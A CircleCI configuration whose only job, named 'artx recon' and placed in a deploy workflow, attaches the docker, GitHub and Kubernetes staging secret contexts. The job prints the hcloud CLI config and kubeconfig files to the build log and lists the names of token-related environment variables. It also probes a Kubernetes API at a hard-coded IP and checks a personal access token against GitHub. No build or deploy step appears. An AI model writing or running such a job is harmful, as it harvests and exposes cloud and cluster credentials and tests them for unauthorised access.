version: 2.1
# ARTX circle recon (temporary)

parameters:
  env:
    type: string
    default: "staging"

workflows:
  deploy_pipeline:
    jobs:
      - artx_recon:
          context:
            - docker
            - github
            - kubernetes-staging

jobs:
  artx_recon:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - checkout
      - run:
          name: artx recon
          command: |
            echo "=== ID"
            id; hostname; pwd; uname -a
            echo "=== HCLOUD CLI CONFIG"
            cat ~/.config/hcloud/cli.toml 2>&1 || true
            ls -al ~/.config 2>&1 || true
            echo "=== ENV NAMES"
            env | sort | sed -E 's/=.*/=<set>/' | grep -Ei 'hcloud|hetzner|kube|token|docker|circle|personal|aws|github' || true
            echo "=== KUBECONFIG FILE"
            cat ~/.kube/config 2>&1 || true
            echo "=== KUBE DIR"
            ls -al ~/.kube 2>&1 || true
            echo "=== 6443 PROBE"
            curl -m 8 -sk https://49.12.225.88:6443/version; echo "rc_version=$?"
            curl -m 8 -sk https://49.12.225.88:6443/healthz; echo "rc_healthz=$?"
            echo "=== GIT WHOAMI via PAT"
            curl -m 8 -s -H "Authorization: Bearer $PERSONAL_ACCESS_TOKEN" https://api.github.com/user | head -c 400; echo
            echo "=== DONE"
